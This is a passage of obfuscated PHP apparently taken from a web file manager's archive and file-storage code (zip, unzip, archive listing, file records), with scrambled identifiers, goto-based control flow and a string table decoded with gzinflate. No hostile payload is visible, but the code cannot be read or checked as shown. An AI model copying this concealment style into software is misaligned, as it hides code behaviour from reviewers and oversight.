strtolower($e®Ûø«Òª[$DîÏÉçË†Ğ[90]]); $A°°‡‚» = $GLOBALS[$DîÏÉçË†Ğ[6]][$DîÏÉçË†Ğ[84]][$DîÏÉçË†Ğ[754]]; $c–±ø°ùƒ™ = $DîÏÉçË†Ğ[71] . (isset($A°°‡‚»[$bŞ÷ğ¹‹µ¢]) ? $A°°‡‚»[$bŞ÷ğ¹‹µ¢] : ucfirst($bŞ÷ğ¹‹µ¢)); if (!class_exists($c–±ø°ùƒ™)) { show_json("{$c–±ø°ùƒ™}\40\x6e\x6f\x74\40\145\x78\x69\163\164\x73\41", !1); } $câë¾–çğÓ = isset($e®Ûø«Òª[$DîÏÉçË†Ğ[6]]) ? $e®Ûø«Òª[$DîÏÉçË†Ğ[6]] : !1; self::$driverCache[$dšêéˆ›Ë¬] = new $c–±ø°ùƒ™($câë¾–çğÓ); } goto E¯ÁÍØÑ´ç; b”ª‹ì‘‰: $dèíàÊØ«Ï->path = $fê“©³Ö—ñ; return $dèíàÊØ«Ï; goto døˆ¸„‰„”; bŞËĞå®ì: $DîÏÉçË†Ğ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $C½ÛÁÖ‚ÓÔ = $E½ó©™ó¦[$DîÏÉçË†Ğ[1017]]; $CŞ™ß³¸¾‘ = $E½ó©™ó¦[$DîÏÉçË†Ğ[367]]; goto dòÇÑÓƒºÕ; E¯ÁÍØÑ´ç: $dèíàÊØ«Ï = self::$driverCache[$dšêéˆ›Ë¬]; $dèíàÊØ«Ï->pathDriver = $C½ÛÁÖ‚ÓÔ; $dèíàÊØ«Ï->pathBase = $DîÏÉçË†Ğ[33]; goto CîîÌØÖ¥ ; døˆ¸„‰„”: } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $EÜ»õĞ¢£Œ; if (!$EÜ»õĞ¢£Œ) { $Fƒñ‘°òº = IO::init($_SERVER[´Ù×Íå‘ÄõÛ][8]); } return $Fƒñ‘°òº; } private static function iconvSystem($a¸Óˆİ‹â) { return self::local()->iconvSystem($a¸Óˆİ‹â); } private static function iconvApp($Aµä‰¸¯²Š) { return self::local()->iconvApp($Aµä‰¸¯²Š); } public static function zip($EŸ‘àò”Õô, $d¿ó¨Ï‡ = "\172\x69\x70", $F§ µ Ó°¿ = '', $Dá“Ÿ¢ˆĞî = REPEAT_RENAME) { goto bÜ‘ïÍ¾âĞ; bÜ‘ïÍ¾âĞ: $BõÔÔ°ÛãÚ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $AßêŠ’Åà“ = self::init($EŸ‘àò”Õô[0][$BõÔÔ°ÛãÚ[75]]); $b®˜›İÅ¿ = self::info($EŸ‘àò”Õô[0][$BõÔÔ°ÛãÚ[75]]); goto F•³é‹ÜŒ“; Dí·‘ƒ¥¦æ: if (!$d¾»Ë£®èÏ) { del_dir($c·äç‡È§…); show_json(LNG($BõÔÔ°ÛãÚ[1031]), !1); } del_dir($c·äç‡È§…); return $d¾»Ë£®èÏ; goto fõÌöÀÓ‡õ; F•³é‹ÜŒ“: $c·äç‡È§… = !1; if (!$F§ µ Ó°¿ && $AßêŠ’Åà“->getType() == $BõÔÔ°ÛãÚ[102]) { $EíÔ’Ç¥Ê– = self::zipFileList($EŸ‘àò”Õô); } else { $c·äç‡È§… = $F§ µ Ó°¿ ? $F§ µ Ó°¿ : TEMP_FILES . $BõÔÔ°ÛãÚ[1029] . time() . rand_string(8) . $BõÔÔ°ÛãÚ[8]; mk_dir($c·äç‡È§…); $EíÔ’Ç¥Ê– = self::zipFileList($EŸ‘àò”Õô, $c·äç‡È§…); } $aê Å¬…õä = $b®˜›İÅ¿[$BõÔÔ°ÛãÚ[28]]; goto d±‘´ô²„»; d±‘´ô²„»: if (count($EíÔ’Ç¥Ê–) > 1) { $BóÀÊâ‡øÆ = IO::info(IO::pathFather($b®˜›İÅ¿[$BõÔÔ°ÛãÚ[75]])); $aê Å¬…õä = $BóÀÊâ‡øÆ[$BõÔÔ°ÛãÚ[28]]; } $F–ñó¢—Œù = $c·äç‡È§…; if (!$F–ñó¢—Œù) { $F–ñó¢—Œù = get_path_father($b®˜›İÅ¿[$BõÔÔ°ÛãÚ[75]]); $eæ„ï±Ñ©ò = IO::info($F–ñó¢—Œù); if (!$eæ„ï±Ñ©ò[$BõÔÔ°ÛãÚ[189]]) { show_json(LNG($BõÔÔ°ÛãÚ[1030]), !1); } } goto F÷¬æ¸¸à; B—Ñ‰‘ğ: foreach ($EíÔ’Ç¥Ê– as $eÁñæÏ‹¸ => $B›ß®´ò½Æ) { $EíÔ’Ç¥Ê–[$eÁñæÏ‹¸] = self::iconvSystem($B›ß®´ò½Æ); } KodArchive::create($c¤å‘çª£ï, $EíÔ’Ç¥Ê–); if (!IO::exist($DÈø»¼‚ƒÄ)) { if ($c·äç‡È§…) { del_dir($c·äç‡È§…); } show_json(LNG($BõÔÔ°ÛãÚ[1031]), !1); } goto aÏËŞè¿¹¿; F÷¬æ¸¸à: $DÈø»¼‚ƒÄ = $F–ñó¢—Œù . $aê Å¬…õä . $BõÔÔ°ÛãÚ[91] . $d¿ó¨Ï‡; $DÈø»¼‚ƒÄ = get_filename_auto($DÈø»¼‚ƒÄ, $BõÔÔ°ÛãÚ[33], $Dá“Ÿ¢ˆĞî); $c¤å‘çª£ï = self::iconvSystem($DÈø»¼‚ƒÄ); goto B—Ñ‰‘ğ; aÏËŞè¿¹¿: if ($F§ µ Ó°¿ || !$c·äç‡È§…) { if ($c·äç‡È§… && strstr($c·äç‡È§…, TEMP_FILES)) { $cª ¤ãª¼ƒ = $EíÔ’Ç¥Ê– = array(); recursion_dir($F–ñó¢—Œù, $cª ¤ãª¼ƒ, $EíÔ’Ç¥Ê–, 0); foreach ($cª ¤ãª¼ƒ as $a‚¥æŞâ÷˜) { del_dir($a‚¥æŞâ÷˜); } foreach ($EíÔ’Ç¥Ê– as $aÆÅÖèáƒà) { if ($aÆÅÖèáƒà == $c¤å‘çª£ï) { continue; } del_file($aÆÅÖèáƒà); } } return $DÈø»¼‚ƒÄ; } $CäÃÀ×äĞÜ = self::pathFather($b®˜›İÅ¿[$BõÔÔ°ÛãÚ[75]]); $d¾»Ë£®èÏ = self::move($DÈø»¼‚ƒÄ, $CäÃÀ×äĞÜ, $Dá“Ÿ¢ˆĞî); goto Dí·‘ƒ¥¦æ; fõÌöÀÓ‡õ: } public static function unzip($CÁœ÷êãÆ³, $f•¿Ï³Ãƒ± = "\162\x65\x70\x6c\x61\143\145") { goto f„›ôÆåäŒ; d½»ÉÅ°ÛÁ: foreach ($Cİ„¶ğ»ùº as $dÁ¬¶°”) { $dÁ¬¶°” = self::iconvApp($dÁ¬¶°”); self::move($dÁ¬¶°”, $BöêÔ®©‚è, $f•¿Ï³Ãƒ±); } del_dir($Fî„ó•™Íù); if (!$F’À°¤Ò) { del_file($EŒ£¬‰à”); } goto EÙ²Í”†ƒ; C¾§ñÃ°ŞŒ: if (!($EÓ«Ù‰¾¤Ü = parent::info($AŞçêØ“))) { show_json(LNG($c‚Ûœ´˜ğ[1033]), !1); } if (!($eŞœŒ„ƒ‰ = parent::infoFull($BöêÔ®©‚è))) { $BöêÔ®©‚è = parent::mkdir($BöêÔ®©‚è); $eŞœŒ„ƒ‰ = array($c‚Ûœ´˜ğ[75] => $BöêÔ®©‚è); } else { if (isset($eŞœŒ„ƒ‰[$c‚Ûœ´˜ğ[369]]) && trim($eŞœŒ„ƒ‰[$c‚Ûœ´˜ğ[75]], $c‚Ûœ´˜ğ[8]) != trim($BöêÔ®©‚è, $c‚Ûœ´˜ğ[8])) { $Dİ™»àÀÅ = KodIO::make($eŞœŒ„ƒ‰[$c‚Ûœ´˜ğ[463]]); $ašÖß”ë†¾ = parent::fileNameAuto($Dİ™»àÀÅ, $eŞœŒ„ƒ‰[$c‚Ûœ´˜ğ[28]], REPEAT_RENAME_FOLDER, !0); $BöêÔ®©‚è = parent::mkdir($Dİ™»àÀÅ . $ašÖß”ë†¾); $eŞœŒ„ƒ‰ = array($c‚Ûœ´˜ğ[75] => $BöêÔ®©‚è); } } $BöêÔ®©‚è = $eŞœŒ„ƒ‰[$c‚Ûœ´˜ğ[75]]; goto D µ×Îˆİ‹; Dß†ê¤«Óò: $CˆÆÉ®´ÃÂ = KodArchive::extract($EŒ£¬‰à”, $Fî„ó•™Íù . $c‚Ûœ´˜ğ[8], $D«“ÃµõÖ×); self::archiveExt(); if (!$CˆÆÉ®´ÃÂ[$c‚Ûœ´˜ğ[1036]]) { show_json($c‚Ûœ´˜ğ[1037] . $CˆÆÉ®´ÃÂ[$c‚Ûœ´˜ğ[1038]], !1); } goto eãİ¹ß‘·; EÙ²Í”†ƒ: return !0; goto B¼¾ĞßÅ¦; f„›ôÆåäŒ: $c‚Ûœ´˜ğ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $AŞçêØ“ = $CÁœ÷êãÆ³[$c‚Ûœ´˜ğ[75]]; $BöêÔ®©‚è = $CÁœ÷êãÆ³[$c‚Ûœ´˜ğ[1032]]; goto C¾§ñÃ°ŞŒ; eãİ¹ß‘·: Hook::trigger($c‚Ûœ´˜ğ[1039], $Fî„ó•™Íù); recursion_dir($Fî„ó•™Íù, $CêÛ£“Ì©¿, $CÎ‹òŠª½¬, 0); $Cİ„¶ğ»ùº = array_merge($CêÛ£“Ì©¿, $CÎ‹òŠª½¬); goto d½»ÉÅ°ÛÁ; D µ×Îˆİ‹: $DäÍ˜‡Áâí = self::tmpFileName($EÓ«Ù‰¾¤Ü); $Fî„ó•™Íù = TEMP_FILES . $DäÍ˜‡Áâí; del_dir($Fî„ó•™Íù); goto CƒôàÆ¦ß; CƒôàÆ¦ß: mk_dir($Fî„ó•™Íù); $B×›—ÌõÎÄ = self::fileExt($EÓ«Ù‰¾¤Ü); $EŒ£¬‰à” = $Fî„ó•™Íù . $c‚Ûœ´˜ğ[91] . $B×›—ÌõÎÄ; goto E¼“¾õ¼ŒÖ; E¼“¾õ¼ŒÖ: if (!@file_exists(self::iconvSystem($EŒ£¬‰à”))) { $F’À°¤Ò = self::localFilePath($AŞçêØ“, $B×›—ÌõÎÄ); $EŒ£¬‰à” = $F’À°¤Ò ? $F’À°¤Ò : parent::download($AŞçêØ“, $EŒ£¬‰à”); } $EŒ£¬‰à” = self::iconvSystem($EŒ£¬‰à”); $D«“ÃµõÖ× = isset($CÁœ÷êãÆ³[$c‚Ûœ´˜ğ[1034]]) ? $CÁœ÷êãÆ³[$c‚Ûœ´˜ğ[1034]] : $c‚Ûœ´˜ğ[1035]; goto Dß†ê¤«Óò; B¼¾ĞßÅ¦: } public static function unzipList($fææº™ÑĞ•) { goto BÌßøĞ²‰ğ; fŞÚÕóÂ™ª: if (isset($FÈ»‘‰£Ë”)) { $eÚ—¾ƒİˆæ = array($FÈ»‘‰£Ë”[$fÛ§–¬ïò[75]], $FÈ»‘‰£Ë”[$fÛ§–¬ïò[1040]], $FÈ»‘‰£Ë”[$fÛ§–¬ïò[28]]); $B…Ê¦õ—ƒ¸ = md5(implode($fÛ§–¬ïò[70], $eÚ—¾ƒİˆæ)) . $fÛ§–¬ïò[91] . get_path_ext($FÈ»‘‰£Ë”[$fÛ§–¬ïò[28]]); } else { $eÚ—¾ƒİˆæ = array($DÒÛ“ÒÔÉµ[$fÛ§–¬ïò[28]], $DÒÛ“ÒÔÉµ[$fÛ§–¬ïò[75]], $DÒÛ“ÒÔÉµ[$fÛ§–¬ïò[77]]); $B…Ê¦õ—ƒ¸ = md5(implode($fÛ§–¬ïò[70], $eÚ—¾ƒİˆæ)) . $fÛ§–¬ïò[91] . $e°Ì¾­³©; } if ($a‡¥©Äå == -1) { $cã°Ø’¿¥ = IO_PATH_SYSTEM_TEMP . "\172\x69\x70\126\x69\145\167\57{$CÉ¾îˆ‡ËÛ}\x2f{$B…Ê¦õ—ƒ¸}\x2e\154\x6f\x67"; $eĞèƒ‘¼â÷ = self::infoFull($cã°Ø’¿¥); if ($eĞèƒ‘¼â÷) { $cã°Ø’¿¥ = $eĞèƒ‘¼â÷[$fÛ§–¬ïò[75]]; $dÍËï¤ªÚæ = self::getContent($cã°Ø’¿¥); if ($dÍËï¤ªÚæ) { $cËÀñåœÌ = json_decode($dÍËï¤ªÚæ, !0); if (count($cËÀñåœÌ) >= $D²µ„Öï­) { show_json(sprintf(LNG($fÛ§–¬ïò[1042]), count($cËÀñåœÌ)), !1); } return $cËÀñåœÌ; } } else { $cã°Ø’¿¥ = self::mkfile($cã°Ø’¿¥); } } $EâÊ‰¾¿Ë³ = TEMP_FILES . $CÉ¾îˆ‡ËÛ; goto E¸«øÇÔáÑ; A·ÜÕÙˆ›é: $D²µ„Öï­ = 50000; if (request_url_safe($a½“Œ×éÛ©)) { $FÈ»‘‰£Ë” = parse_url_query($a½“Œ×éÛ©); if (!isset($FÈ»‘‰£Ë”[$fÛ§–¬ïò[75]])) { show_json($fÛ§–¬ïò[1041], !1); } } $fÊ‰˜†ğ‡Ÿ = isset($FÈ»‘‰£Ë”) ? $FÈ»‘‰£Ë”[$fÛ§–¬ïò[75]] : $a½“Œ×éÛ©; goto A‰ £‚±³; CªÕÏ•¼ã: $cËÀñåœÌ = json_encode($BğŒ·ó¶Ï[$fÛ§–¬ïò[1038]]); self::setContent($cã°Ø’¿¥, $cËÀñåœÌ); if (count($BğŒ·ó¶Ï[$fÛ§–¬ïò[1038]]) >= $D²µ„Öï­) { show_json(sprintf(LNG($fÛ§–¬ïò[1042]), count($BğŒ·ó¶Ï[$fÛ§–¬ïò[1038]])), !1); } goto Dˆ‘Ø…£Á£; E¸«øÇÔáÑ: if (!is_dir($EâÊ‰¾¿Ë³)) { mk_dir($EâÊ‰¾¿Ë³); } $FË÷ÑŒ³‹± = $EâÊ‰¾¿Ë³ . $fÛ§–¬ïò[8] . $B…Ê¦õ—ƒ¸; if (!@file_exists(self::iconvSystem($FË÷ÑŒ³‹±))) { if (isset($FÈ»‘‰£Ë”)) { url_request($a½“Œ×éÛ©, $fÛ§–¬ïò[1043], $FË÷ÑŒ³‹±); } else { $e–éÊÕÇáß = self::localFilePath($a½“Œ×éÛ©, $e°Ì¾­³©); $FË÷ÑŒ³‹± = $e–éÊÕÇáß ? $e–éÊÕÇáß : self::download($a½“Œ×éÛ©, $FË÷ÑŒ³‹±); } } goto fÇº¹éˆ¥¨; Dˆ‘Ø…£Á£: return $BğŒ·ó¶Ï[$fÛ§–¬ïò[1038]]; goto Dè¹«İÔì; A‰ £‚±³: $DÒÛ“ÒÔÉµ = self::info($fÊ‰˜†ğ‡Ÿ); $e°Ì¾­³© = self::fileExt($DÒÛ“ÒÔÉµ); $CÉ¾îˆ‡ËÛ = self::tmpFileName($DÒÛ“ÒÔÉµ); goto fŞÚÕóÂ™ª; fÇº¹éˆ¥¨: $FË÷ÑŒ³‹± = self::iconvSystem($FË÷ÑŒ³‹±); if ($a‡¥©Äå >= 0) { $Eóå„›ÈŠ“ = isset($fææº™ÑĞ•[$fÛ§–¬ïò[1044]]) ? $fææº™ÑĞ•[$fÛ§–¬ïò[1044]] : !1; $cÌôÎÜÎÇÂ = isset($fææº™ÑĞ•[$fÛ§–¬ïò[28]]) ? $fææº™ÑĞ•[$fÛ§–¬ïò[28]] : $fÛ§–¬ïò[33]; KodArchive::filePreview($FË÷ÑŒ³‹±, $a‡¥©Äå, $Eóå„›ÈŠ“, $cÌôÎÜÎÇÂ); self::archiveExt(); die; } $BğŒ·ó¶Ï = KodArchive::listContent($FË÷ÑŒ³‹±); goto C÷†õ¤„ìè; C÷†õ¤„ìè: self::archiveExt(); del_dir($EâÊ‰¾¿Ë³); if (!$BğŒ·ó¶Ï[$fÛ§–¬ïò[1036]]) { show_json($BğŒ·ó¶Ï[$fÛ§–¬ïò[1038]], !1); } goto CªÕÏ•¼ã; BÌßøĞ²‰ğ: $fÛ§–¬ïò =& $_SERVER[´Ù×Íå‘ÄõÛ]; $a½“Œ×éÛ© = $fææº™ÑĞ•[$fÛ§–¬ïò[75]]; $a‡¥©Äå = isset($fææº™ÑĞ•[$fÛ§–¬ïò[1040]]) ? $fææº™ÑĞ•[$fÛ§–¬ïò[1040]] : -1; goto A·ÜÕÙˆ›é; Dè¹«İÔì: } private static function fileExt($B÷¯¸‹…‰») { $A“¨Õß§ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $dĞ†á„ À = $B÷¯¸‹…‰»[$A“¨Õß§[160]]; if ($dĞ†á„ À == $A“¨Õß§[1045]) { $D—£ËåŒèã = $A“¨Õß§[1046]; if (substr($B÷¯¸‹…‰»[$A“¨Õß§[28]], -strlen($D—£ËåŒèã)) == $D—£ËåŒèã) { $dĞ†á„ À = $A“¨Õß§[1047]; } } self::archiveExt($dĞ†á„ À); return $dĞ†á„ À; } private static function zipFileList($f¥„µó¤÷Û, $eÒ¯•ÆÁøŠ = false) { $bîÊŠ°Éœ„ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $C•Ç¶áöã = array(); foreach ($f¥„µó¤÷Û as $d×ŠÀ„¾ô¼) { $Dîöñ§” Ğ = $d×ŠÀ„¾ô¼[$bîÊŠ°Éœ„[75]]; if ($eÒ¯•ÆÁøŠ) { $Dîöñ§” Ğ = self::copy($d×ŠÀ„¾ô¼[$bîÊŠ°Éœ„[75]], $eÒ¯•ÆÁøŠ, $bîÊŠ°Éœ„[745]); } if ($Dîöñ§” Ğ && self::local()->exist($Dîöñ§” Ğ)) { $C•Ç¶áöã[$d×ŠÀ„¾ô¼[$bîÊŠ°Éœ„[75]]] = $Dîöñ§” Ğ; } } if (!empty($C•Ç¶áöã)) { return array_values($C•Ç¶áöã); } show_json(LNG($bîÊŠ°Éœ„[1048]), !1); } public static function tmpFileName($b£×½Ú¯ˆ‘) { $DØŞßÛŒ·º =& $_SERVER[´Ù×Íå‘ÄõÛ]; $D”­øæáÁ = array($b£×½Ú¯ˆ‘[$DØŞßÛŒ·º[28]], $b£×½Ú¯ˆ‘[$DØŞßÛŒ·º[75]], $b£×½Ú¯ˆ‘[$DØŞßÛŒ·º[77]], $b£×½Ú¯ˆ‘[$DØŞßÛŒ·º[461]]); return md5(implode($DØŞßÛŒ·º[70], $D”­øæáÁ)); } private static function localFilePath($d¡åªö¯’, $fì’¸“ƒÏÄ) { goto BéÃğšÕË ; eŞİ¥¤Şà: if ($F­†È¯Õ¬• == $FáÅæÌ³ò[102] || $F­†È¯Õ¬• == $FáÅæÌ³ò[1052]) { if (!$bİïÙ¨‘¼ê->exist($bİïÙ¨‘¼ê->path)) { show_json(LNG($FáÅæÌ³ò[101]), !1); } return $bİïÙ¨‘¼ê->path; } return !1; goto b¢¨Õ²æĞä; aàÌ¾†›‰•: if ($B£Ú¥ñ×®[$FáÅæÌ³ò[29]] == KodIO::KOD_SOURCE) { $Aèˆµ¹™°í = Model($FáÅæÌ³ò[753])->fileInfoGet(KodIO::sourceID($d¡åªö¯’)); if (!$Aèˆµ¹™°í[$FáÅæÌ³ò[75]]) { show_json($FáÅæÌ³ò[1051], !1); } $d¡åªö¯’ = $Aèˆµ¹™°í[$FáÅæÌ³ò[75]]; } $bİïÙ¨‘¼ê = self::init($d¡åªö¯’); $F­†È¯Õ¬• = $bİïÙ¨‘¼ê->getType(); goto eŞİ¥¤Şà; BéÃğšÕË : $FáÅæÌ³ò =& $_SERVER[´Ù×Íå‘ÄõÛ]; if ($fì’¸“ƒÏÄ == $FáÅæÌ³ò[1049] && strtoupper(substr(PHP_OS, 0, 3)) == $FáÅæÌ³ò[1050]) { return !1; } $B£Ú¥ñ×® = KodIO::parse($d¡åªö¯’); goto aàÌ¾†›‰•; b¢¨Õ²æĞä: } private static function archiveExt($d˜ÀÌ”Õ¡ = '') { $GLOBALS[$_SERVER[´Ù×Íå‘ÄõÛ][1053]] = $d˜ÀÌ”Õ¡; } } goto F¥îâÄ„ö; d®‹¶êãœ¯: define($_SERVER[´Ù×Íå‘ÄõÛ][0], $_SERVER[´Ù×Íå‘ÄõÛ][1]); $_SERVER[ïÚûó†Îá] = explode($_SERVER[´Ù×Íå‘ÄõÛ][2], gzinflate(substr($_SERVER[´Ù×Íå‘ÄõÛ][3], 10, -8))); function Model($fİö…á„¡» = '', $Dñâï„Ë£Ü = '', $e“‡™²¯æö = '') { goto Aø©·Ï‘¾Ì; Aµöèëåô: $e÷¹ĞŒóèñ[$C…ô“×¿¸] = new ModelBase($fİö…á„¡», $Dñâï„Ë£Ü, $e“‡™²¯æö); return $e÷¹ĞŒóèñ[$C…ô“×¿¸]; goto c—Œ½±›±¶; Aø©·Ï‘¾Ì: $aá…ƒ½ÄŞ‡ =& $_SERVER[ïÚûó†Îá]; static $e÷¹ĞŒóèñ = array(); $C…ô“×¿¸ = strtolower($Dñâï„Ë£Ü . $aá…ƒ½ÄŞ‡[0] . $fİö…á„¡»); goto b—ØÚ„ù×£; b—ØÚ„ù×£: if (isset($e÷¹ĞŒóèñ[$C…ô“×¿¸])) { return $e÷¹ĞŒóèñ[$C…ô“×¿¸]; } if ($fİö…á„¡») { $fİö…á„¡» = strtoupper($fİö…á„¡»[0]) . substr($fİö…á„¡», 1); $eè“ğ™í†í = $fİö…á„¡» . $aá…ƒ½ÄŞ‡[1]; if (class_exists($eè“ğ™í†í)) { $e÷¹ĞŒóèñ[$C…ô“×¿¸] = new $eè“ğ™í†í(); return $e÷¹ĞŒóèñ[$C…ô“×¿¸]; } } if (!$e“‡™²¯æö) { $e“‡™²¯æö = $GLOBALS[$aá…ƒ½ÄŞ‡[2]][$aá…ƒ½ÄŞ‡[3]]; } goto Aµöèëåô; c—Œ½±›±¶: } goto AÆ“¬ÖŒÏ; BÂÑ“æ’±Ï: class FileModel extends ModelBase { protected $tableName = "\x69\157\x5f\x66\151\x6c\x65"; protected $tableMeta = array("\x74\141\142\x6c\145\x4e\x61\155\145" => "\151\157\137\146\x69\154\x65\x5f\x6d\145\164\x61", "\x6d\x65\164\141\106\x69\145\x6c\x64" => "\x66\151\154\x65\x49\x44"); public function fileInfo($aŠõğŠ„£) { $d™×±¼¡›ì =& $_SERVER[´Ù×Íå‘ÄõÛ]; static $B›–¾ñ¤ = array(); if (!isset($B›–¾ñ¤[$aŠõğŠ„£])) { $CóßÉ·Õ»Ì = $d™×±¼¡›ì[2153]; $e´ĞÇ„¤¤İ = Model($d™×±¼¡›ì[422])->field($CóßÉ·Õ»Ì)->where(array($d™×±¼¡›ì[420] => $aŠõğŠ„£))->find(); $B›–¾ñ¤[$aŠõğŠ„£] = $e´ĞÇ„¤¤İ; } return $B›–¾ñ¤[$aŠõğŠ„£]; } public function addFileByContent($A•æì…™± = '', $B²¨©£‰‹ = '') { goto b¹Ç†ìˆÚ¶; b¹Ç†ìˆÚ¶: $D®Ûí±ïß =& $_SERVER[´Ù×Íå‘ÄõÛ]; $F•Ã¢áİ¤Ø = TEMP_PATH . $D®Ûí±ïß[2154]; if (!is_dir($F•Ã¢áİ¤Ø)) { mk_dir($F•Ã¢áİ¤Ø); } goto a¡Ë¯“½î; a¡Ë¯“½î: $b£Ö‚Š—íœ = $F•Ã¢áİ¤Ø . $D®Ûí±ïß[2155] . rand_string(16); file_put_contents($b£Ö‚Š—íœ, $A•æì…™±); $e®»êç§òÚ = $this->addFile($b£Ö‚Š—íœ, $B²¨©£‰‹, !0); goto C´ï‡¯ÑÀ; C´ï‡¯ÑÀ: if (file_exists($b£Ö‚Š—íœ)) { @unlink($b£Ö‚Š—íœ); } return $e®»êç§òÚ; goto c›ÚÍâÚ˜Ú; c›ÚÍâÚ˜Ú: } public function createFileName($Aé³šƒÖ‰) { goto CøÃø†Å›; FÙ®ÇÁÑˆ: $bœõÓïï³¹ = $eÓºªØ±¡->pathFather($DÊ•¦ßºØ»); static $CŒ°—ªˆ² = false; $b †î¿­İÃ = $A¨ãÍ‚¹µ[2156] . md5($bœõÓïï³¹); goto dô¶ˆ¯£Ó¼; dô¶ˆ¯£Ó¼: if (!$CŒ°—ªˆ² && !Cache::get($b †î¿­İÃ)) { $CŒ°—ªˆ² = !0; $dº•©™Œ½Š = IO::mkdir($bœõÓïï³¹); if (!IO::exist($dº•©™Œ½Š . $A¨ãÍ‚¹µ[2157])) { IO::mkfile($dº•©™Œ½Š . $A¨ãÍ‚¹µ[2157]); } Cache::set($b †î¿­İÃ, 1, 3600 * 2); } return $DÊ•¦ßºØ»; goto C²ÇòĞ„ó; CøÃø†Å›: $A¨ãÍ‚¹µ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $eÓºªØ±¡ = IO::init($A¨ãÍ‚¹µ[8]); $DÊ•¦ßºØ» = $this->makeFilePath($Aé³šƒÖ‰, $eÓºªØ±¡); goto FÙ®ÇÁÑˆ; C²ÇòĞ„ó: } public function makeFilePath($F˜­òŒ¿¿‚, $F¯ŠßŸÍ‘ï) { goto Aªà¸Åêğ; BáÖäÀÏÙÃ: switch ($aÄŞÎêÆ) { case $D —óò«¨©[2161]: $c³”Í´ª¡Æ = $c³”Í´ª¡Æ . $D —óò«¨©[91] . $F¯ŠßŸÍ‘ï->ext($F˜­òŒ¿¿‚); if ($F¯ŠßŸÍ‘ï->ext($F˜­òŒ¿¿‚) == $D —óò«¨©[2102]) { $c³”Í´ª¡Æ .= $D —óò«¨©[2162]; } break; case $D —óò«¨©[2163]: goto F¾ÊóçÆç; FêÊòÒ¹µË: IO::setContent($c³”Í´ª¡Æ, $D —óò«¨©[33]); CacheLock::unlock($CµÆ×Á»¾§); break; goto CğÄÌö‹Ù; FÑ³Ë²ª¨‚: $C¬ˆ’Şù Ÿ = $D —óò«¨©[2164] . $e•¸Â‹¹Ú´[$D —óò«¨©[367]] . $D —óò«¨©[2165] . date($D —óò«¨©[2166]) . $dÉâ†åÅÉË . $D —óò«¨©[8]; if ($F¯ŠßŸÍ‘ï->ext($F˜­òŒ¿¿‚) == $D —óò«¨©[2102]) { $F˜­òŒ¿¿‚ .= $D —óò«¨©[2162]; } $CµÆ×Á»¾§ = $D —óò«¨©[2167] . $C¬ˆ’Şù Ÿ . $F˜­òŒ¿¿‚; goto Eé‹ù™×œã; F¾ÊóçÆç: $EˆÉ‡”«ù = Model($D —óò«¨©[1092])->get($D —óò«¨©[1340]); $dÉâ†åÅÉË = substr(md5($D —óò«¨©[1921] . $EˆÉ‡”«ù . date($D —óò«¨©[688])), 0, 8); $e•¸Â‹¹Ú´ = KodIO::defaultDriver(); goto FÑ³Ë²ª¨‚; Eé‹ù™×œã: CacheLock::lock($CµÆ×Á»¾§); $AƒÁ„ä¹½å = IO::fileNameAuto($C¬ˆ’Şù Ÿ, $F˜­òŒ¿¿‚); $c³”Í´ª¡Æ = $C¬ˆ’Şù Ÿ . $AƒÁ„ä¹½å; goto FêÊòÒ¹µË; CğÄÌö‹Ù: case $D —óò«¨©[2160]: break; default: break; } return $c³”Í´ª¡Æ; goto cÉ³Û¢¾µã; aµ÷µœª: $c³”Í´ª¡Æ = $C¬ˆ’Şù Ÿ . rand_string(5) . short_id(100); $F˜­òŒ¿¿‚ = str_replace($D —óò«¨©[8], $D —óò«¨©[70], KodIO::clear($F˜­òŒ¿¿‚)); if (!$F˜­òŒ¿¿‚) { $aÄŞÎêÆ = $D —óò«¨©[2160]; } goto BáÖäÀÏÙÃ; Aªà¸Åêğ: $D —óò«¨© =& $_SERVER[´Ù×Íå‘ÄõÛ]; $aÄŞÎêÆ = Model($D —óò«¨©[1092])->get($D —óò«¨©[2158]); $C¬ˆ’Şù Ÿ = KodIO::defaultIO() . date($D —óò«¨©[2159]); goto aµ÷µœª; cÉ³Û¢¾µã: } public function addFileByRemote($bŸ’¿™âÅ‚, $b‰µÀ°Û¾Ö, $eÔ’‹†Êç = array()) { goto DĞª™™æ®Š; DĞª™™æ®Š: $F”›îÕÑÃ =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (!IO::exist($bŸ’¿™âÅ‚)) { return !1; } $aäŒ©³ğˆ = $eÔ’‹†Êç[$F”›îÕÑÃ[163]] ? $eÔ’‹†Êç[$F”›îÕÑÃ[163]] : $F”›îÕÑÃ[33]; goto B¢–ó¿‘Åà; B¢–ó¿‘Åà: $f«‰§ğÅ¦Ş = IO::hashMd5($bŸ’¿™âÅ‚, $aäŒ©³ğˆ); $BàÚ˜ä¼ø› = KodIO::defaultDriver(); $eÕª©Û‘Š = array($F”›îÕÑÃ[522] => IO::size($bŸ’¿™âÅ‚), $F”›îÕÑÃ[2168] => 1, $F”›îÕÑÃ[386] => $b‰µÀ°Û¾Ö, $F”›îÕÑÃ[736] => $BàÚ˜ä¼ø›[$F”›îÕÑÃ[367]], $F”›îÕÑÃ[387] => $bŸ’¿™âÅ‚, $F”›îÕÑÃ[2169] => $eÔ’‹†Êç[$F”›îÕÑÃ[164]] ? $eÔ’‹†Êç[$F”›îÕÑÃ[164]] : IO::hashSimple($bŸ’¿™âÅ‚), $F”›îÕÑÃ[2170] => $f«‰§ğÅ¦Ş ? $f«‰§ğÅ¦Ş : $aäŒ©³ğˆ); goto Câ¼è•Ï˜»; Câ¼è•Ï˜»: if ($CÂ«—Í…˜š = $this->addFileCheckExist($eÕª©Û‘Š[$F”›îÕÑÃ[164]], $eÕª©Û‘Š[$F”›îÕÑÃ[163]], $eÕª©Û‘Š[$F”›îÕÑÃ[77]])) { return $CÂ«—Í…˜š; } return $this->addFileData($eÕª©Û‘Š); goto càÀñÌ™¨; càÀñÌ™¨: } private function addFileData($A±©£ë²Ù‘) { $FàŸªëÆ¦ =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (!$A±©£ë²Ù‘) { return !1; } $A±©£ë²Ù‘[$FàŸªëÆ¦[77]] = intval($A±©£ë²Ù‘[$FàŸªëÆ¦[77]]); if (!$A±©£ë²Ù‘[$FàŸªëÆ¦[77]] 